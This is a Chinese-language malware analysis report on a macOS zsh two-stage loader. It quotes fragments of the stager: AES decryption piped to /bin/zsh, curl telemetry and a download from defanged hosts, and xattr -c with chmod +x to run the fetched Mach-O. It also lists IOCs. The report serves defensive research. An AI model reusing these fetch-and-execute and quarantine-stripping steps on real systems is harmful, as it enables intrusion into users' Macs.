---
title: "恶意样本分析：macOS two-stage shell loader (unattributed)（other · zsh · ef1c40e8）"
published: 2026-11-09
draft: false
description: "恶意（置信度低）：macOS two-stage shell loader (unattributed) · loader/downloader/dropper · 难度 medium · 纯静态分析"
tags: ["macOS two-stage", "loader", "downloader", "dropper", "Script"]
category: "恶意样本日报"
lang: "zh"
---

> [!WARNING]
> **判定：恶意** · 家族 **macOS two-stage shell loader (unattributed)**（存疑） · 置信度 **低**
> 
> 别名：macOS zsh stager、Mach-O downloader
> 
> 外层 zsh 脚本把四段十六进制数据当作密文,用脚本内计算的 MD5(1472) 作为 AES-128-CTR 密钥(零 IV)解密并 gunzip,得到明文二级 zsh 脚本(已静态还原并核对)。二级脚本明确使用 curl 向 plume-compass[.]com 回传带 user/BuildID 头的遥测,从 lake-90[.]com 下载 Mach-O 到 /tmp 隐藏文件,执行 xattr -c 去除隔离属性、chmod +x 后直接运行。解密所得代码即直接证据,无需依赖样本执行。

## 速览

| 项目 | 内容 |
|:--|:--|
| 家族 | **macOS two-stage shell loader (unattributed)** · 别名 macOS zsh stager、Mach-O downloader · _存疑_ |
| 置信度 | **低** |
| 行为类 | loader · downloader · dropper |
| 难度 | medium |
| 首次出现 | 2026-11-06 16:28:22 |
| 分析方法 | 纯静态分析 |
| 来源 | [MalwareBazaar](https://bazaar.abuse.ch/sample/ef1c40e8bca817a3849062b064f6bb64b5ae146831ac64771e8df56111dfe2ec/) |

## 攻击链

<svg viewBox="0 0 720 302" width="100%" role="img" aria-label="攻击链概览" xmlns="http://www.w3.org/2000/svg" style="font-family:inherit;font-size:13px;line-height:1.2">
<defs><marker id="acArrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" fill-opacity="0.55"/></marker></defs>
<line x1="26" y1="34" x2="26" y2="234" stroke="currentColor" stroke-opacity="0.22" stroke-width="2"/>
<circle cx="26" cy="34" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="39" fill="currentColor" font-weight="600" font-size="13.5">解密内置加密载荷</text>
<text x="470" y="39" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1140</text>
<text x="613" y="38" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="84" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="89" fill="currentColor" font-weight="600" font-size="13.5">管道执行二级脚本</text>
<text x="470" y="89" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1059.004</text>
<text x="613" y="88" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="134" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="139" fill="currentColor" font-weight="600" font-size="13.5">八进制转义隐藏命令</text>
<text x="470" y="139" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1027</text>
<text x="613" y="138" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="184" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="189" fill="currentColor" font-weight="600" font-size="13.5">创建伪装更新目录</text>
<text x="470" y="189" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1036</text>
<text x="613" y="188" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="234" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="239" fill="currentColor" font-weight="600" font-size="13.5">采集主机环境信息</text>
<text x="470" y="239" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1082</text>
<text x="613" y="238" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
</svg>

## 样本标识

| 项目 | 值 |
|:--|:--|
| SHA-256 | `ef1c40e8bca817a3849062b064f6bb64b5ae146831ac64771e8df56111dfe2ec` |
| MD5 | _未记录_ |
| 大小 | 2,896 字节（2.8 KB） |
| 类型 | other · `zsh` |

## 行为分析

共 **9** 条行为，每条都挂了证据，且全部静态可得。

### 1. 解密内置加密载荷

`T1140` · 置信度 **高** · 静态

把 _schema_id、_feature_flags、_license_salt、_rollout_key 四段十六进制串拼接后经 xxd -r -p 还原为 800 字节密文,用 _kb=1472 的 MD5 作 AES-128-CTR 密钥(IV 全零)解密,再 gunzip 得到明文 zsh 脚本。

> **证据**：off 2618 _blob=(...) ; off 2693 _k=$(printf '%s' "$_kb" | md5) ; off 2729 openssl enc -d -aes-128-ctr -iv 000...0 | gunzip
> 
> **来源**：`ev-000001` · `ev-000002`

### 2. 管道执行二级脚本

`T1059.004` · 置信度 **高** · 静态

将解密结果通过 print -r -- 管道直接交给 /bin/zsh 执行,不在磁盘落地脚本文件。

> **证据**：off 2867 print -r -- "$_r" | /bin/zsh
> 
> **来源**：`ev-000001` · `ev-000002`

### 3. 八进制转义隐藏命令

`T1027` · 置信度 **高** · 静态

用 printf 的八进制转义动态拼出 curl、xattr、chmod 及全部 URL,规避明文关键字检测。

> **证据**：ge8n6/oeq1d/zcat8/ylp57 与二级脚本 printf 'http...' 处
> 
> **来源**：`ev-000001` · `ev-000002`

### 4. 创建伪装更新目录

`T1036` · 置信度 **高** · 静态

在 $HOME/Library/Caches/update_wjtdiu 建立状态目录并写入 last_check 时间戳,同时输出 channel: stable 伪装成正常软件更新检查。

> **证据**：off 500 _state_dir="$HOME/Library/Caches/update_wjtdiu" ; off 1067 写入 last_check ; off 1120 channel: stable
> 
> **来源**：`ev-000001`

### 5. 采集主机环境信息

`T1082` · 置信度 **高** · 静态

二级脚本执行 whoami 获取当前用户,并用 sysctl -n hw.memsize 读取物理内存大小,记录两个 RANDOM 值。

> **证据**：二级脚本 t6iibocn="$(whoami)" ; lqkhdae="$(sysctl -n hw.memsize ...)"
> 
> **来源**：`ev-000002`

### 6. 回传植入遥测

`T1071.001` · 置信度 **高** · 静态

用 curl 向 hxxps://plume-compass[.]com/api/metrics/run?event=pasted 发送 POST,携带 user 与 BuildID 自定义头,后台静默执行。

> **证据**：二级脚本 curl -fsS -4 -X POST -H 'user: AgK...' -H 'BuildID: AgL...' "${dqg8aw}"
> 
> **来源**：`ev-000002`

### 7. 下载二阶段载荷

`T1105` · 置信度 **高** · 静态

curl -fsSL 从 hxxps://lake-90[.]com/f/fhi5wsf_mpmq1dks3tn4hw/oyn2lshh 下载文件到 /tmp/.mlqio32we.$$ 并移动到 /tmp/.mlqio32we。

> **证据**：二级脚本 ${zih5w} -fsSL -o ${naiuzp} ${ocsrrx} && mv ${naiuzp} ${f070gm}
> 
> **来源**：`ev-000002`

### 8. 去除隔离属性

`T1553.001` · 置信度 **高** · 静态

对下载文件执行 xattr -c 清除扩展属性(含 com.apple.quarantine),随后 chmod +x 赋予可执行权限。

> **证据**：二级脚本 ${fpxnu} -c ${f070gm} && ${njoom} +x ${f070gm}(fpxnu=xattr,njoom=chmod)
> 
> **来源**：`ev-000002`

### 9. 执行下载的载荷

`T1059.004` · 置信度 **高** · 静态

在 POST event=stager 遥测后直接运行 /tmp/.mlqio32we,把执行权交给下载的 Mach-O。

> **证据**：二级脚本 ... && { curl ... event=stager ... & } && ${f070gm}
> 
> **来源**：`ev-000002`


## IOC（已去武器化）

### 网络

:::caution
**待动态验证**：上述地址为静态分析所得，分析环境网络隔离下未观察到成功的连接或会话，真实 C2 的响应与下发内容仍未知。
:::

| 类型 | 值 | 端口 | 角色 | 证据来源 | 动态观测 |
|:--|:--|--:|:--|:--|:--|
| http | `hxxps://plume-compass[.]com/api/metrics/run?event=pasted` | 443 | c2 | 静态 | ⏳ 未观测 |
| http | `hxxps://plume-compass[.]com/api/metrics/run?event=stager` | 443 | c2 | 静态 | ⏳ 未观测 |
| http | `hxxps://lake-90[.]com/f/fhi5wsf_mpmq1dks3tn4hw/oyn2lshh` | 443 | download | 静态 | ⏳ 未观测 |

### 主机

**落地路径**

- `$HOME/Library/Caches/update_wjtdiu`
- `$HOME/Library/Caches/update_wjtdiu/last_check`
- `/tmp/.mlqio32we.$$`
- `/tmp/.mlqio32we`

### 配置

| 键 | 值 | 必需 | 证据来源 |
|:--|:--|:--|:--|
| `c2_hosts` | `plume-compass[.]com;lake-90[.]com` | 是 | 静态 |
| `c2_uri` | `/api/metrics/run?event=pasted;/api/metrics/run?event=stager;/f/fhi5wsf_mpmq1dks3tn4hw/oyn2lshh` | 是 | 静态 |
| `encryption_algo` | `AES-128-CTR (key=MD5(1472), IV=0) + gzip` | 是 | 静态 |
| `stage2_sha256` | `5847be4209b8c6d468fc41b389761c904c337c27c973a30260c4066cf19956d0` | 否 | 静态 |
| `install_path` | `/tmp/.mlqio32we` | 是 | 静态 |
| `state_dir` | `$HOME/Library/Caches/update_wjtdiu` | 否 | 静态 |
| `http_headers` | `user;BuildID` | 否 | 静态 |

## 不应误判

:::important
以下结论**容易被误判**，引用本报告时请注意。

- 不能凭下载链接和遥测断定二阶段 Mach-O 的具体家族、窃密目标或是否属于已知 macOS stealer;本次未取得也未运行该二进制。
- 样本未出现文件加密、勒索提示或数据擦除行为,不应归类为 ransomware 或 wiper。
- 这是 macOS/zsh 脚本,未发现 Windows 注册表、服务或计划任务写入,不应按 Windows PE 恶意软件的行为面描述。
:::

## 分析方法与局限

| 项目 | 内容 |
|:--|:--|
| 分析方法 | 纯静态分析 |
| 脱壳 | 否 |

**局限与待验证**

1. 本次为纯静态档位,未执行样本;所有行为来自对脚本与静态解密所得二级脚本的代码审阅。
2. lake-90[.]com 上的二阶段 Mach-O 未下载、未分析,其真实功能与家族未知。
3. 所有 C2 均未做网络可达性或响应验证,统一标记 static + pending_dynamic_verify。
4. 缺少 YARA/多引擎佐证,family 归因不确定。

## 证据索引

<details>
<summary>展开 2 条工具证据</summary>

| 证据 ID | 工具 | 摘要 |
|:--|:--|:--|
| `ev-000001` | 字符串提取 | 对原始 .zsh 做 ASCII/UTF-16 字符串抽取,定位全部变量赋值、十六进制密文段、MD5/xxd/openssl/gunzip 派生点及 print \| /bin/zsh 执行点。 |
| `ev-000002` | evidence.record | 按脚本逻辑本地复算 _kb=1472 与 MD5 密钥,完成 AES-128-CTR(零 IV)+gunzip 静态解密,得到二级 zsh 脚本(sha256 5847be...)并提取 C2、下载 URL 与命令序列;未执行样本。 |

</details>

---

_本报告样本不公开，IOC 已去武器化，仅供安全研究。_
